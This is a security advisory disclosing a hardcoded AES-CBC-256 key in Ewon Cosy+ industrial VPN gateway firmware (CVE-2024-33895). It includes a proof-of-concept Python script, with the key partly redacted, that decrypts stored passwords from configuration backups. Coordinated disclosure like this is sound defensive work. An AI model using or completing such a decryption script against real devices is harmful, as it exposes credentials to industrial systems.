Advisory ID:               SYSS-2024-032
Product:                   Ewon Cosy+
Manufacturer:              HMS Industrial Networks AB
Affected Version(s):       Firmware Versions: < 21.2s10 and < 22.1s3
Tested Version(s):         Firmware Version: 21.2s7
Vulnerability Type:        Use of Hard-coded Cryptographic Key (CWE-321)
Risk Level:                Medium
Solution Status:           Fixed
Manufacturer Notification: 2024-04-10
Solution Date:             2024-07-18
Public Disclosure:         2024-08-11
CVE Reference:             CVE-2024-33895
Author of Advisory:        Moritz Abrell, SySS GmbH

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

The Ewon Cosy+ is a VPN gateway used for remote access and maintenance
in industrial environments.

The manufacturer describes the product as follows (see [1]):

"The Ewon Cosy+ gateway establishes a secure VPN connection between
the machine (PLC, HMI, or other devices) and the remote engineer.
The connection happens through Talk2m, a highly secured industrial
cloud service. The Ewon Cosy+ makes industrial remote access easy
and secure like never before!"

Due to the use of a hardcoded cryptographic key, an attacker is able to
decrypt encrypted data and retrieve sensitive information.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

The Ewon Cosy+ stores sensitive data such as passwords in an encrypted
format.
These values are included, e.g., in configuration backups.

However, a symmetric encryption algorithm (AES-CBC-256) with hardcoded
and static cryptographic keys is used.
Thus, an attacker is able to decrypt that data and retrieve sensitive
information.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

By analyzing the ELF executable "ewon" of an Ewon Cosy+ in a disassembler
and decompiler, e.g. Ghidra, the encryption mechanism could be reversed
and the hardcoded cryptographic key could be extracted.

Used encryption algorithm: AES in CBC mode with a key length of 256 bit

A simple Python script was developed to decrypt encrypted values:

********************
import base64
import sys
from Crypto.Cipher import AES
from binascii import unhexlify

def pad(text):
    padding_length = AES.block_size - (len(text) % AES.block_size)
    padded_text = text + bytes([padding_length] * padding_length)
    return padded_text, padding_length

encoded_text = sys.argv[1]

key_hex = "6367b0 [...]" # redacted
iv_hex = "28c9 [...]" # redacted

key = unhexlify(key_hex)
iv = unhexlify(iv_hex)

decoded_text = base64.b64decode(encoded_text[4:])
padded_text, padding_length = pad(decoded_text)
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted_text = cipher.decrypt(padded_text)

print("Plaintext: {}".format(
    decrypted_text[1:][:-padding_length-2].decode('utf-8')
    ))
****************

$> python3 decrypt_ewon_pwd.py "#_5_YARU3GSgNcElltjyMMqWfZwb"
Plaintext: adm:123

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

According to the manufacturer note[4], the vulnerability was fixed
with the firmware versions 21.2s10 and 22.1s3.
